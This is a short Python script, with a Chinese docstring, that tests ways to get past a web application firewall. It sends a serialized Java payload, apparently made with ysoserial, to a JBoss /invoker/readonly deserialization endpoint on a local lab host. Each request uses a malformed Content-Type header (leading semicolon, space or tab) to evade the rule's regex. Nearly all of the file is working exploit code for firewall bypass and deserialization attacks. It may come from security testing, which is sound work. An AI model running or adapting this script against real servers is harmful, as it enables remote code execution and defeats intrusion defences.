# -*- coding: utf-8 -*-
"""raw socket 测 CT 头形状变体（绕 920420 外层正则 ^[^;\s]+）。"""
import socket
import sys

sys.path.insert(0, "..")
from common import gen_yso  # noqa: E402  仅复用路径常量

data = open("bypass3_mut.ser", "rb").read()


def send(ct_value, name):
    sock = socket.create_connection(("127.0.0.1", 18380), timeout=25)
    req = (
        "POST /invoker/readonly HTTP/1.1\r\n"
        "Host: evil.com\r\n"
        "Content-Type: %s\r\n"
        "Content-Length: %d\r\n"
        "Connection: close\r\n\r\n" % (ct_value, len(data))
    ).encode("latin-1") + data
    sock.sendall(req)
    resp = b""
    while True:
        try:
            chunk = sock.recv(65536)
        except socket.timeout:
            break
        if not chunk:
            break
        resp += chunk
    sock.close()
    status = resp.split(b"\r\n", 1)[0].decode(errors="replace")
    print("%-28s -> %s" % (name, status))


send(";application/octet-stream", "v1 lead-semicolon")
send(" ;application/octet-stream", "v2 lead-space")
send("\tapplication/octet-stream", "v3 lead-tab")
